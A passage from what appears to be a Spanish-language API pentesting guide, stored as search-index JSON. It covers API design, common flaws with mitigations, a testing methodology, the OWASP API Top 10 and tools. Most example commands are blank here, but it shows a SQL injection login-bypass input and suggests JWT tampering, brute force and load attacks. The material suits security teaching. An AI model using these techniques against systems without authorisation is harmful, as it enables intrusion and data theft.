</ul>"},{"location":"pentest/pentest-apis/#apis-de-socios","title":"APIs de socios","text":"<ul> <li>Acceso limitado a socios comerciales espec\u00edficos</li> <li>Requieren autenticaci\u00f3n y autorizaci\u00f3n estrictas</li> <li>Ejemplo: APIs de integraci\u00f3n B2B</li> </ul>"},{"location":"pentest/pentest-apis/#arquitectura-y-desarrollo","title":"ARQUITECTURA Y DESARROLLO","text":"<p>Si quieres saber c\u00f3mo vulnerar algo necesitas conocer primero su estructura, as\u00ed que aqu\u00ed se explicara la arquitectura y desarrollo de las APIs</p>"},{"location":"pentest/pentest-apis/#arquitectura-basada-en-recursos","title":"Arquitectura basada en recursos","text":"<ul> <li>Cada recurso es identificable y accesible mediante una URL \u00fanica</li> <li>Los recursos est\u00e1n organizados jer\u00e1rquicamente</li> <li>Ejemplo: para la colecci\u00f3n de usuarios, para un usuario especifico /users/users/123</li> </ul>"},{"location":"pentest/pentest-apis/#diseno-de-endpoints","title":"Dise\u00f1o de endpoints","text":"<ul> <li>Use sustantivos en plural para colecciones: /articles/users</li> <li>Use identificadores \u00fanicos para recursos espec\u00edficos: /articles/789/users/123</li> <li>Agrupe recursos relacionados: /users/123/posts</li> <li>Use par\u00e1metros de consulta para filtrado y paginaci\u00f3n: /articles?category=tech&amp;page=2</li> </ul>"},{"location":"pentest/pentest-apis/#metodos-de-http","title":"M\u00e9todos de HTTP","text":"<ul> <li>GET: Recuperar recursos</li> <li>POST: Crear nuevos recursos</li> <li>PUT: Actualizar recursos existentes (reemplazando completamente)</li> <li>PATCH: Actualizar parcialmente recursos existentes</li> <li>DELETE: Eliminar recursos</li> </ul>"},{"location":"pentest/pentest-apis/#formatos-de-datos","title":"Formatos de datos","text":""},{"location":"pentest/pentest-apis/#json-notacion-de-objetos-javascript","title":"JSON (notaci\u00f3n de objetos JavaScript)","text":"<ul> <li>Ligero y f\u00e1cil de leer</li> <li>Soportado por la mayor\u00eda de los lenguajes de programaci\u00f3n</li> <li>Ejemplo: </li> </ul>"},{"location":"pentest/pentest-apis/#xml-lenguaje-de-marcado-extensible","title":"XML (Lenguaje de Marcado Extensible)","text":"<ul> <li>Mas verboso que JSON, pero m\u00e1s estructurado</li> <li>\u00datil para datos complejos y anidados</li> <li>Ejemplo: </li> </ul>"},{"location":"pentest/pentest-apis/#autenticacion-y-autorizacion","title":"Autenticaci\u00f3n y autorizaci\u00f3n","text":"<ul> <li>QAuth 2.0: Protocolo de autorizaci\u00f3n est\u00e1ndar de la industria</li> <li>API Keys: Claves \u00fanicas para identificar y autorizar clientes</li> <li>JWT (JSON Web Token): Tokens compactos y seguros para transmitir informaci\u00f3n entre partes</li> <li>Basic Auth: Autenticaci\u00f3n simple usando nombre de usuario y contrase\u00f1a</li> </ul>"},{"location":"pentest/pentest-apis/#versionado-de-apis","title":"Versionado de APIs","text":"<ul> <li>Versionado en la URL: /api/v1/users</li> <li>Versi\u00f3n en el header: application/vnd.company.v1+json</li> <li>Versionado por par\u00e1metro: /api/users?version=1</li> </ul>"},{"location":"pentest/pentest-apis/#documentacion","title":"Documentaci\u00f3n","text":"<ul> <li>OpenAPI (anteriormente Swagger): Especificaci\u00f3n para documentar APIs RESTful</li> <li>API Blueprint: Lenguaje de alto nivel para describir APIs</li> <li>RAML (RESTful API Modeling Language): Lenguaje basado en YAML para descubrir APIs RESTful</li> </ul>"},{"location":"pentest/pentest-apis/#fallos-frecuentes-en-apis","title":"FALLOS FRECUENTES EN APIs","text":"<p>Una vez que se tenga experiencia en esto, te podr\u00e1s dar cuenta de que los m\u00e9todos de explotaci\u00f3n se basan mayormente en estas fallas por parte de los desarrolladores.</p>"},{"location":"pentest/pentest-apis/#exposicion-de-informacion-sensible","title":"Exposici\u00f3n de informaci\u00f3n sensible","text":"<ul> <li> <p>Descripci\u00f3n - Las APIs pueden revelar inadvertidamente datos sensibles en sus respuestas</p> </li> <li> <p>Causas comunes</p> <ul> <li>Falta de filtrado de datos sensibles</li> <li>Respuestas de error demasiado detalladas</li> <li>Metadata expuesta innecesariamente</li> </ul> </li> <li> <p>Ejemplo - Una API de perfil de usuario que incluye el n\u00famero de seguridad social completo en la respuesta</p> </li> <li> <p>Mitigaci\u00f3n - Implementar un filtrado cuidadoso de datos sensible antes de enviar respuestas</p> </li> </ul>"},{"location":"pentest/pentest-apis/#autenticacion-debil","title":"Autenticaci\u00f3n d\u00e9bil","text":"<ul> <li> <p>Descripci\u00f3n - Mecanismos de autenticaci\u00f3n que pueden ser f\u00e1cilmente eludidos o comprometidos</p> </li> <li> <p>Causas comunes</p> <ul> <li>Uso de m\u00e9todos de autenticaci\u00f3n obsoletos</li> <li>Implementaci\u00f3n incorrecta de protocolos de autenticaci\u00f3n</li> <li>Falta de protecci\u00f3n contra ataques de fuerza bruta</li> </ul> </li> <li> <p>Ejemplo - Una API que utiliza Basic Auth sobre HTTP sin SSL/TLS</p> </li> <li> <p>Mitigaci\u00f3n - Implementar m\u00e9todos de autenticaci\u00f3n como OAuth 2.0 con JWT, usar HTTPS, implementar bloqueo de cuentas despu\u00e9s de m\u00faltiples intentos fallidos.</p> </li> </ul>"},{"location":"pentest/pentest-apis/#autorizacion-inadecuada","title":"Autorizaci\u00f3n inadecuada","text":"<ul> <li> <p>Descripci\u00f3n - Fallas en el control de acceso que permiten a los usuarios realizar acciones o acceder a datos m\u00e1s all\u00e1 de sus permisos</p> </li> <li> <p>Causas comunes</p> <ul> <li>Comprobaciones de autorizaci\u00f3n insuficientes</li> <li>Confianza excesiva en los tokens de cliente</li> <li>Falta de segregaci\u00f3n de roles</li> </ul> </li> <li> <p>Ejemplo - Un usuario regular puede acceder a la ruta /api/admin/users que deber\u00eda estar restringida solo a administradores</p> </li> <li> <p>Mitigaci\u00f3n - Implementar controles de acceso granulares, validar permisos en el servidor para cada solicitud</p> </li> </ul>"},{"location":"pentest/pentest-apis/#inyeccion-de-datos-maliciosos","title":"Inyecci\u00f3n de datos maliciosos","text":"<ul> <li> <p>Descripci\u00f3n - Inserci\u00f3n de c\u00f3digo malicioso a trav\u00e9s de entradas de usuario no sanitizadas</p> </li> <li> <p>Causas comunes</p> <ul> <li>SQL Injection</li> <li>NoSQL Injection</li> <li>Command Injection</li> <li>XML External Entity (XXE) Injection</li> </ul> </li> <li> <p>Ejemplo - Entrada maliciosa: username=admin\u2019\u2014 Query vulnerable: SELECT * FROM users WHERE username = \u2018admin\u2019 AND password = \u2018password\u2019</p> </li> <li> <p>Mitigaci\u00f3n - Usar consultas parametrizadas, validar y Sanitizar todas las entradas de usuario, implementar el principio de menor privilegio en las conexiones de base de datos.</p> </li> </ul>"},{"location":"pentest/pentest-apis/#ataques-de-denegacion-de-servicio-dos","title":"Ataques de denegaci\u00f3n de servicio (DoS)","text":"<ul> <li> <p>Descripci\u00f3n - Intentos de hacer que la API sea inaccesible sobrecargando el sistema.</p> </li> <li> <p>Causas comunes</p> <ul> <li>Ataques de inundaci\u00f3n (flood attacks)</li> <li>Ataques de slowloris</li> <li>Ataques de amplificaci\u00f3n</li> </ul> </li> <li> <p>Ejemplo - Enviar miles de solicitudes por segundo a un endpoint de API no protegido.</p> </li> <li> <p>Mitigaci\u00f3n - Implementar rate limiting, usar servicios de mitigaci\u00f3n de DDoS, optimizar el rendimiento de la API</p> </li> </ul>"},{"location":"pentest/pentest-apis/#man-in-the-middle-attacks","title":"Man-in-the-middle attacks","text":"<ul> <li> <p>Descripci\u00f3n - Interceptaci\u00f3n de comunicaciones entre el cliente y la API</p> </li> <li> <p>Causas comunes</p> <ul> <li>Falta de encriptaci\u00f3n (no usar HTTPS)</li> <li>Certificados SSL/TLS mal configurados</li> <li>Vulnerabilidades en el protocolo de comunicaci\u00f3n</li> </ul> </li> <li> <p>Ejemplo - Un atacante en una red Wi-Fi publica intercepta las credenciales enviadas a una API que no usa HTTPS</p> </li> <li> <p>Mitigaci\u00f3n - Usar HTTPS para todas las comunicaciones, implementar certificate pinning, usar protocolos de comunicaci\u00f3n seguros.</p> </li> </ul>"},{"location":"pentest/pentest-apis/#manipulacion-de-parametros","title":"Manipulaci\u00f3n de par\u00e1metros","text":"<ul> <li> <p>Descripci\u00f3n - Modificaci\u00f3n de par\u00e1metros de solicitud para obtener acceso no autorizado o alterar la l\u00f3gica de la aplicaci\u00f3n</p> </li> <li> <p>Causas comunes</p> <ul> <li>Tampering de par\u00e1metros de URL</li> <li>Manipulaci\u00f3n de cuerpo de solicitud</li> <li>Alteraci\u00f3n de headers HTTP</li> </ul> </li> <li> <p>Ejemplo - Cambiar el ID de usuario en la URL de /api/user/123/profile a /api/user/456/profile para acceder al perfil de otro usuario</p> </li> <li> <p>Mitigaci\u00f3n - Validar y autorizar todas las entradas del usuario en el servidor, no confiar en los datos enviados por el cliente</p> </li> </ul>"},{"location":"pentest/pentest-apis/#configuraciones-incorrectas","title":"Configuraciones incorrectas","text":"<ul> <li> <p>Descripci\u00f3n - Errores en la configuraci\u00f3n de la API o su infraestructura que crean vulnerabilidades</p> </li> <li> <p>Causas comunes</p> <ul> <li>Configuraciones por defecto no seguras</li> <li>Errores humanos en la configuraci\u00f3n</li> <li>Falta de hardening de servidores</li> </ul> </li> <li> <p>Ejemplo - Dejar habilitado el modo de depuraci\u00f3n en un entorno de producci\u00f3n, exponiendo informaci\u00f3n sensible en los mensajes de error</p> </li> <li> <p>Mitigaci\u00f3n - Implementar listas de verificaci\u00f3n de seguridad, realizar auditor\u00edas regulares, usar herramientas de escaneo de configuraci\u00f3n.</p> </li> </ul>"},{"location":"pentest/pentest-apis/#metodologia-de-pentesting-en-apis","title":"METODOLOGIA DE PENTESTING EN APIs","text":""},{"location":"pentest/pentest-apis/#reconocimiento","title":"Reconocimiento","text":"<p>Objetivo: Recopilar toda la informaci\u00f3n posible sobre la API objetivo</p> <p>T\u00e9cnicas:</p> <ul> <li>Identificaci\u00f3n de endpoints</li> <li>Analizar la documentaci\u00f3n de la API (si est\u00e1 disponible)</li> <li>Utilizar herramientas de descubrimiento como OWASP Amass, Sublist3r</li> <li>Realizar fuzzing de directorios y par\u00e1metros</li> <li>Ejemplo de comando </li> </ul>"},{"location":"pentest/pentest-apis/#analisis-de-documentacion","title":"An\u00e1lisis de documentaci\u00f3n","text":"<ul> <li>Buscar archivos Swagger/OpenAPI</li> <li>Revisar gu\u00edas de desarrolladores y documentaci\u00f3n p\u00fablica</li> <li>Examinar repositorios de c\u00f3digo abierto relacionados</li> </ul>"},{"location":"pentest/pentest-apis/#enumeracion-de-recursos","title":"Enumeraci\u00f3n de recursos","text":"<ul> <li>Identificar los diferentes tipos de recursos expuestos (usuarios, productos, etc.)</li> <li>Determinar la estructura de los datos devueltos</li> <li>Mapear las relaciones entre diferentes endpoints</li> </ul>"},{"location":"pentest/pentest-apis/#fingerprinting","title":"Fingerprinting","text":"<ul> <li>Identificar tecnolog\u00edas utilizadas (framework, lenguaje, servidor web)</li> <li>Examinar headers de respuesta HTTP para obtener informaci\u00f3n</li> <li>EJEMPLO PARA OBTENER HEADERS: </li> </ul>"},{"location":"pentest/pentest-apis/#analisis-de-trafico","title":"An\u00e1lisis de trafico","text":"<ul> <li>Capturar y analizar el tr\u00e1fico de la API usando herramientas como Wireshark o Burp Suite.</li> <li>Identificar patrones en las solicitudes y respuestas.</li> </ul> <p>Objetivo: Evaluar a fondo la implementaci\u00f3n y la l\u00f3gica de la API.</p> <p>T\u00e9cnicas</p> <ol> <li> <p>Revisi\u00f3n de mecanismos de autenticaci\u00f3n</p> <ul> <li>Identificar el tipo de autenticaci\u00f3n utilizado (API Keys, OAuth, JWT, etc.,)</li> <li>Analizar el proceso de obtenci\u00f3n y renovaci\u00f3n de tokens</li> <li>Evaluar la fortaleza de las credenciales y tokens</li> </ul> </li> <li> <p>Evaluaci\u00f3n de l\u00f3gica de negocio</p> <ul> <li>Mapear los flujos de trabajo y procesos de negocio</li> <li>Identificar posibles bypasses o ataques de l\u00f3gica</li> <li>Buscar condiciones de carrera en operaciones criticas</li> </ul> </li> <li> <p>An\u00e1lisis de manejo de datos</p> <ul> <li>Evaluar la validaci\u00f3n y sanitizaci\u00f3n de entradas</li> <li>Verificar el filtrado de datos sensibles en las respuestas</li> <li>Analizar la integridad de los datos en operaciones CRUD</li> </ul> </li> <li> <p>Revisi\u00f3n de control de acceso</p> <ul> <li>Identificar los diferentes roles y niveles de acceso</li> <li>Probar el acceso horizontal y vertical entre recursos</li> <li>Verificar la aplicaci\u00f3n consistente de controles de acceso</li> </ul> </li> <li> <p>An\u00e1lisis de rate limiting y throttling</p> <ul> <li>Determinar si existen l\u00edmites de tasa</li> <li>Evaluar la efectividad de las medidas anti-automatizacion</li> <li>Buscar formas de eludir las restricciones implementadas</li> </ul> </li> </ol>"},{"location":"pentest/pentest-apis/#explotacion","title":"Explotaci\u00f3n","text":"<p>Objetivo: Aprovechar las vulnerabilidades identificadas para demostrar el impacto potencial.</p> <p>T\u00e9cnicas</p> <ul> <li> <p>Pruebas de vulnerabilidades identificadas</p> <ul> <li>Explotar fallas de autenticaci\u00f3n (Fuerza bruta, manipulaci\u00f3n de tokens, etc.)</li> <li>Realizar ataques de inyecci\u00f3n (SQL, NoSQL, XML, etc. )</li> <li>Explotar vulnerabilidades de deserializaci\u00f3n</li> </ul> </li> <li> <p>Ejemplo de payload SQL Injection </p> </li> </ul>"},{"location":"pentest/pentest-apis/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<ul> <li>Intentar acceder a funcionalidades de administrador desde cuentas normales</li> <li>Modificar tokens JWT para aumentar privilegios</li> <li>Explotar fallas en la l\u00f3gica de negocio para obtener accesos no autorizados</li> </ul>"},{"location":"pentest/pentest-apis/#bypass-de-controles-de-seguridad","title":"Bypass de controles de seguridad","text":"<ul> <li>Eludir validaciones del lado del cliente</li> <li>Manipular par\u00e1metros para saltarse restricciones</li> <li>Utilizar t\u00e9cnicas de ofuscaci\u00f3n para evadir WAFs o filtros</li> </ul>"},{"location":"pentest/pentest-apis/#explotacion-de-configuraciones-incorrectas","title":"Explotaci\u00f3n de configuraciones incorrectas","text":"<ul> <li>Aprovechar endpoints de depuraci\u00f3n o desarrollo expuestos</li> <li>Explotar servicios mal configurados en el servidor</li> <li>Utilizar m\u00e9todos HTTP no est\u00e1ndar o poco comunes</li> </ul>"},{"location":"pentest/pentest-apis/#ataques-de-denegacion-de-servicio","title":"Ataques de denegaci\u00f3n de servicio","text":"<ul> <li>Realizar pruebas controladas de sobrecarga de endpoints</li> <li>Explotar operaciones costosas para agotar recursos del servidor</li> <li>Identificar puntos de congesti\u00f3n en la arquitectura de la API</li> </ul>"},{"location":"pentest/pentest-apis/#reporte","title":"Reporte","text":"<p>Objetivo: Documentar y comunicar los hallazgos de manera clara y efectiva</p> <p>Elementos clave</p> <ol> <li> <p>Documentaci\u00f3n de hallazgos</p> <ul> <li>Descripci\u00f3n detallada de cada vulnerabilidad</li> <li>Pasos para producir el problema</li> <li>Evidencias (screenshots, logs, payloads utilizados)</li> </ul> </li> <li> <p>Clasificaci\u00f3n de vulnerabilidades</p> <ul> <li>Utilizar un sistema de calificaci\u00f3n est\u00e1ndar (ej. CVSS)</li> <li>Evaluar el impacto potencial de cada vulnerabilidad</li> <li>Priorizar los problemas bas\u00e1ndose en su severidad y facilidad de explotaci\u00f3n</li> </ul> </li> <li> <p>Recomendaciones de mitigaci\u00f3n</p> <ul> <li>Proporcionar soluciones espec\u00edficas para cada vulnerabilidad</li> <li>Sugerir mejores pr\u00e1cticas generales de seguridad</li> <li>Incluir referencias a est\u00e1ndares y gu\u00edas relevantes</li> </ul> </li> <li> <p>Resumen ejecutivo</p> <ul> <li>Visi\u00f3n general de la evaluaci\u00f3n y sus objetivos</li> <li>Resumen de los hallazgos m\u00e1s cr\u00edticos</li> <li>Conclusiones y recomendaciones clave</li> </ul> </li> <li> <p>Informe t\u00e9cnico detallado</p> <ul> <li>Metodolog\u00eda utilizada</li> <li>Herramientas y t\u00e9cnicas empleadas</li> <li>Descripci\u00f3n detallada de cada prueba realizada</li> <li>An\u00e1lisis en profundidad de las vulnerabilidades encontradas</li> </ul> </li> <li> <p>Plan de remediaci\u00f3n</p> <ul> <li>Pasos concretos para abordar cada vulnerabilidad</li> <li>Estimaci\u00f3n de esfuerzo y priorizaci\u00f3n</li> <li>Sugerencias para verificar la efectividad de las correcciones</li> </ul> </li> </ol>"},{"location":"pentest/pentest-apis/#owasp-api-security-top-10","title":"OWASP API SECURITY TOP 10","text":"<p>El OWASP API Security Top 10 es una lista est\u00e1ndar de las vulnerabilidades m\u00e1s cr\u00edticas en APIs, las cuales detallare a continuaci\u00f3n.</p>"},{"location":"pentest/pentest-apis/#broken-object-level-authorization","title":"Broken Object Level Authorization","text":"<ul> <li>Descripci\u00f3n: Falta de controles de acceso a nivel de objeto, permitiendo acceso no autorizado a datos</li> <li>Ejemplo: Un usuario puede acceder o modificar recursos de otro usuario cambiando el ID en la URL</li> <li>Mitigaci\u00f3n: Implementar controles de autorizaci\u00f3n para cada objeto accedido a trav\u00e9s de la API</li> </ul>"},{"location":"pentest/pentest-apis/#broken-user-authentication","title":"Broken User Authentication","text":"<ul> <li>Descripci\u00f3n: Implementaci\u00f3n incorrecta de mecanismos de autenticaci\u00f3n</li> <li>Ejemplo: Tokens JWT sin expiraci\u00f3n o con algoritmos d\u00e9biles</li> <li>Mitigaci\u00f3n: Utilizar est\u00e1ndares probados como OAuth 2.0 con implementaci\u00f3n adecuada</li> </ul>"},{"location":"pentest/pentest-apis/#excessive-data-exposure","title":"Excessive Data Exposure","text":"<ul> <li>Descripci\u00f3n: La API devuelve m\u00e1s datos de los necesarios, confiando en que el cliente filtrara</li> <li>Ejemplo: Endpoint de perfil de usuario que incluye datos sensibles no necesarios para la vista</li> <li>Mitigaci\u00f3n: Filtrar datos sensibles en el servidor antes de la respuesta</li> </ul>"},{"location":"pentest/pentest-apis/#lack-of-resources-rate-limiting","title":"Lack of Resources &amp; Rate Limiting","text":"<ul> <li>Descripci\u00f3n: Ausencia de l\u00edmites en la frecuencia o volumen de solicitudes</li> <li>Ejemplo: Un atacante puede realizar miles de solicitudes por segundo sin restricciones</li> <li>Mitigaci\u00f3n: Implementar rate limiting y monitoreo de recursos.</li> </ul>"},{"location":"pentest/pentest-apis/#broken-function-level-authorization","title":"Broken Function Level Authorization","text":"<ul> <li>Descripci\u00f3n: Controles de autorizaci\u00f3n inadecuados para funciones especificas</li> <li>Ejemplo: Un usuario regular puede acceder a funciones administrativas</li> <li>Mitigaci\u00f3n: Implementar controles de autorizaci\u00f3n granulares para cada funci\u00f3n</li> </ul>"},{"location":"pentest/pentest-apis/#mass-assignment","title":"Mass Assignment","text":"<ul> <li>Descripci\u00f3n: Binding autom\u00e1tico de par\u00e1metros de cliente a propiedades de objetos internos</li> <li>Ejemplo: Un atacante puede modificar campos que no deber\u00edan ser editables, como role: \u201cadmin\u201d</li> <li>Mitigaci\u00f3n: Implementar listas blancas de propiedades modificables</li> </ul>"},{"location":"pentest/pentest-apis/#security-misconfiguration","title":"Security Misconfiguration","text":"<ul> <li>Descripci\u00f3n: Configuraciones inseguras en cualquier parte del stack de la API</li> <li>Ejemplo: Servidores con configuraciones por defecto, CORS mal configurado</li> <li>Mitigaci\u00f3n: Implementar procesos de hardening y revisi\u00f3n de configuraciones</li> </ul>"},{"location":"pentest/pentest-apis/#injection","title":"Injection","text":"<ul> <li>Descripci\u00f3n: Procesamiento no seguro de datos de entrada del usuario</li> <li>Ejemplo: SQL Injection, NoSQL Injection, Command Injection</li> <li>Mitigaci\u00f3n: Validar, filtrar y Sanitizar todas las entradas del usuario</li> </ul>"},{"location":"pentest/pentest-apis/#improper-assets-management","title":"Improper Assets Management","text":"<ul> <li>Descripci\u00f3n: Falta de inventario y gesti\u00f3n de los endpoints de la API</li> <li>Ejemplo: APIs obsoletas o de prueba expuestas en producci\u00f3n</li> <li>Mitigaci\u00f3n: Mantener un inventario actualizado y eliminar endpoints innecesarios</li> </ul>"},{"location":"pentest/pentest-apis/#insufficient-logging-monitoring","title":"Insufficient Logging &amp; Monitoring","text":"<ul> <li>Descripci\u00f3n: Falta de registro y monitoreo adecuados de actividades de la API</li> <li>Ejemplo: Ataques exitosos que pasan desapercibidos por falta de logs</li> <li>Mitigaci\u00f3n: Implementar logging exhaustivo y sistemas de monitoreo en tiempo real</li> </ul>"},{"location":"pentest/pentest-apis/#tecnicas-de-pentesting-en-apis","title":"TECNICAS DE PENTESTING EN APIs","text":"<p>Hablaremos de algunas t\u00e9cnicas especificas utilizadas en Pentesting de APIs</p>"},{"location":"pentest/pentest-apis/#reconocimiento-y-enumeracion","title":"Reconocimiento y enumeraci\u00f3n","text":"<p>Uso de herramientas como Nmap para escaneo de puertos:</p> <ul> <li>Objetivo: Identificar servicios y puertos abiertos relacionados con la API</li> <li>Ejemplo de comando: </li> <li>Interpretaci\u00f3n: Analizar el resultado para identificar servicios web, bases de datos y otros componentes relevantes</li> </ul>"},{"location":"pentest/pentest-apis/#analisis-de-respuestas-http-para-identificar-tecnologias","title":"An\u00e1lisis de respuestas HTTP para identificar tecnolog\u00edas","text":"<ul> <li>Objetivo: Determinar el stack tecnol\u00f3gico utilizado por la API</li> <li>Herramienta: Wappalyzer (extensi\u00f3n de navegador) o whatweb (l\u00ednea de comandos)</li> <li>Ejemplo de comando: </li> <li>An\u00e1lisis: Investigar cualquier endpoint descubierto que no est\u00e9 en la documentaci\u00f3n oficial</li> </ul>"},{"location":"pentest/pentest-apis/#revision-de-documentacion-publica-y-archivos-de-configuracion","title":"Revisi\u00f3n de documentaci\u00f3n publica y archivos de configuraci\u00f3n","text":"<ul> <li>Objetivo: Obtener informaci\u00f3n sobre la estructura y funcionalidad de la API</li> <li>T\u00e9cnicas:<ul> <li>Buscar archivos Swagger/OpenAPI(/swagger.json,/api-docs)</li> <li>Examinar repositorios p\u00fablicos de c\u00f3digo (GitHub, GitLab)</li> <li>Analizar respuestas de error para obtener pistas sobre la estructura interna</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#autenticacion-y-autorizacion_1","title":"Autenticaci\u00f3n y autorizaci\u00f3n","text":""},{"location":"pentest/pentest-apis/#pruebas-de-fuerza-bruta-en-mecanismos-de-autenticacion","title":"Pruebas de fuerza bruta en mecanismos de autenticaci\u00f3n","text":"<ul> <li>Objetivo: Identificar credenciales d\u00e9biles o pol\u00edticas de contrase\u00f1as inadecuadas</li> <li>Herramientas: Burp Suite Intruder o hydra</li> <li>Ejemplo de comando con hydra: </li> </ul>"},{"location":"pentest/pentest-apis/#verificacion-de-gestion-de-sesiones","title":"Verificaci\u00f3n de gesti\u00f3n de sesiones","text":"<ul> <li>Objetivo: Identificar debilidades en la gesti\u00f3n de sesiones y tokens</li> <li>T\u00e9cnicas:<ul> <li>Analizar la estructura de los tokens (ej. JWT) usando jwt.io</li> <li>Probar la revocaci\u00f3n de tokens despu\u00e9s del logout</li> <li>Verificar la expiraci\u00f3n y renovaci\u00f3n de tokens</li> <li>Ejemplo: Modificar un JWT valido para cambiar el rol de usuario a administrador</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#comprobacion-de-escalada-de-privilegios-horizontal-y-vertical","title":"Comprobaci\u00f3n de escalada de privilegios horizontal y vertical","text":"<ul> <li>Objetivo: Identificar fallas que permitan acceder a recursos de otros usuarios o elevar privilegios</li> <li>T\u00e9cnicas:<ul> <li>Cambiar IDs de usuario en las solicitudes</li> <li>Intentar acceder a endpoints administrativos desde cuentas normales</li> <li>Modificar par\u00e1metros de rol o permisos en tokens o cookies</li> <li>Ejemplo: Cambiar user_id=123 a user_id=456 en la solicitud para acceder a datos de otro usuario</li> </ul> </li> </ul>"},{"location":"pentest/pentest-apis/#inyeccion-de-datos","title":"Inyecci\u00f3n de datos","text":""},{"location":"pentest/pentest-apis/#sql-injection-en-parametros-de-api","title":"SQL Injection en par\u00e1metros de API","text":"<ul> <li>Objetivo: Explotar consultas SQL mal sanitizadas para manipular la base de datos</li> <li>T\u00e9cnicas: Insertar caracteres especiales y comandos SQL en los par\u00e1metros</li> <li>Ejemplo de payload: </li> <li>Herramienta: sqlmap para automatizar la detecci\u00f3n y explotaci\u00f3n</li> <li>Comando de ejemplo con sqlmap: </li> </ul>"},{"location":"pentest/pentest-apis/#nosql-injection","title":"NoSQL Injection","text":"<ul> <li>Objetivo: Explotar consultas NoSQL mal sanitizadas en base de datos como MongoDB</li> <li>T\u00e9cnicas: Utilizar operadores especiales de NoSQL en los par\u00e1metros</li> <li>Ejemplo de payload (MongoDB): </li> <li>An\u00e1lisis: Observar como la API maneja operadores especiales de NoSQL y ajustar los payloads en consecuencia</li> </ul>"},{"location":"pentest/pentest-apis/#xml-external-entity-xxe-injection","title":"XML External Entity (XXE) Injection","text":"<ul> <li>Objetivo: Explotar parsers XML mal configurados para leer archivos del sistema o realizar ataques SSRF</li> <li>T\u00e9cnicas: Insertar entidades externas en payloads XML</li> <li>Ejemplo de payload XXE: </li> </ul>"},{"location":"pentest/pentest-apis/#manejo-inadecuado-de-errores","title":"Manejo inadecuado de errores","text":""},{"location":"pentest/pentest-apis/#analisis-de-mensajes-de-error-detallados","title":"An\u00e1lisis de mensajes de error detallados","text":"<ul> <li>Objetivo: Obtener informaci\u00f3n sensible a trav\u00e9s de mensajes de error</li> <li>T\u00e9cnica: Provocar errores intencionalmente y analizar las respuestas</li> <li>Ejemplo: Enviar tipos de datos incorrectos o valores fuera de rango</li> <li>An\u00e1lisis: Buscar informaci\u00f3n como rutas de archivo, versiones de software, o fragmentos de c\u00f3digo en los mensajes de error</li> </ul>"},{"location":"pentest/pentest-apis/#explotacion-de-informacion-revelada-en-stacktraces","title":"Explotaci\u00f3n de informaci\u00f3n revelada en stacktraces","text":"<ul> <li>Objetivo: Obtener informaci\u00f3n sobre la estructura interna de la aplicaci\u00f3n</li> <li>T\u00e9cnica: Provocar excepciones no manejadas y analizar los stacktraces</li> <li>Ejemplo: Enviar payloads malformados o inesperados para causar errores</li> <li>An\u00e1lisis: Identificar nombres de clases, m\u00e9todos y l\u00edneas de c\u00f3digo para mapear la estructura de la aplicaci\u00f3n</li> </ul>"},{"location":"pentest/pentest-apis/#forzado-de-errores-para-obtener-informacion-adicional","title":"Forzado de errores para obtener informaci\u00f3n adicional","text":"<ul> <li>Objetivo: Descubrir endpoints o funcionalidades ocultas</li> <li>T\u00e9cnica: Manipular par\u00e1metros y headers para provocar diferentes tipos de errores</li> <li>Ejemplo: Cambiar el m\u00e9todo HTTP de GET a PUT en endpoints que no lo esperan</li> <li>An\u00e1lisis: Buscar referencias a otros endpoints o funcionalidades en los mensajes de error</li> </ul>"},{"location":"pentest/pentest-apis/#configuraciones-incorrectas_1","title":"Configuraciones incorrectas","text":""},{"location":"pentest/pentest-apis/#revision-de-headers-http-de-seguridad","title":"Revisi\u00f3n de headers HTTP de seguridad","text":"<ul> <li>Objetivo: Identificar falta de headers de seguridad importantes</li> <li>T\u00e9cnica: Analizar las respuestas HTTP en busca de headers de seguridad</li> <li>Headers a verificar:<ul> <li>X-Frame-Options</li> <li>Content-Security-Policy</li> <li>Strict-Transport-Security</li> <li>X-Content-Type-Options</li> </ul> </li> <li>Herramienta: securityheaders.com para un an\u00e1lisis r\u00e1pido</li> </ul>"},{"location":"pentest/pentest-apis/#verificacion-de-cors-cross-origin-resource-sharing","title":"Verificaci\u00f3n de CORS (Cross-Origin Resource Sharing)","text":"<ul> <li>Objetivo: Identificar configuraciones de CORS demasiado permisivas</li> <li>T\u00e9cnica: Analizar el header Access-Control-Allow-Origin en las respuestas</li> <li>Ejemplo de configuraci\u00f3n insegura: </li> <li>Prueba: Intentar realizar solicitudes desde diferentes or\u00edgenes y observar si son permitidas</li> </ul>"},{"location":"pentest/pentest-apis/#comprobacion-de-ssltls-y-sus-versiones","title":"Comprobaci\u00f3n de SSL/TLS y sus versiones","text":"<ul> <li>Objetivo: Identificar configuraciones SSL/TLS d\u00e9biles o desactualizadas</li> <li>T\u00e9cnica: ssllabs.com o testssl.sh para un an\u00e1lisis detallado</li> <li>Ejemplo de comando con testssl.sh: </li> <li>An\u00e1lisis: Verificar el soporte de protocolos obsoletos (SSLv3, TLSv1.0) y cifrados d\u00e9biles</li> </ul>"},{"location":"pentest/pentest-apis/#analisis-de-rate-limiting-y-proteccion-contra-dos","title":"An\u00e1lisis de rate limiting y protecci\u00f3n contra DoS","text":"<ul> <li>Objetivo: Evaluar la resistencia de la API contra ataques de denegaci\u00f3n de servicio</li> <li>T\u00e9cnica: Realizar m\u00faltiples solicitudes r\u00e1pidas y observar el comportamiento</li> <li>Ejemplo: Usar scripts personalizados o herramientas como Apache Bench (ab) para simular carga</li> <li>Comando de ejemplo con ab: </li> </ul>"},{"location":"pentest/pentest-apis/#herramientas-para-pentesting-de-apis","title":"HERRAMIENTAS PARA PENTESTING DE APIs","text":""},{"location":"pentest/pentest-apis/#herramientas-de-analisis","title":"Herramientas de an\u00e1lisis","text":""},{"location":"pentest/pentest-apis/#postman","title":"Postman","text":"<ul> <li>Descripci\u00f3n: Plataforma de colaboraci\u00f3n para el desarrollo de APIs que tambi\u00e9n sirve para pruebas de seguridad</li> <li>Caracter\u00edsticas principales:<ul> <li>Interfaz gr\u00e1fica intuitiva para enviar solicitudes HTTP</li> <li>Capacidad para crear colecciones de pruebas</li> <li>Scripting pre-request y post-request</li> <li>Generaci\u00f3n autom\u00e1tica de documentaci\u00f3n de API</li> </ul> </li> <li> <p>Ejemplo de uso:</p> <ol> <li>Crear una nueva solicitud POST a https://api.target.com/users</li> <li>A\u00f1adir un header de autenticaci\u00f3n: Authorization: Bearer &lt;token&gt;</li> <li>En el body, agregar un JSON: {\u201cusername\u201d:\u201dtest\u201d, 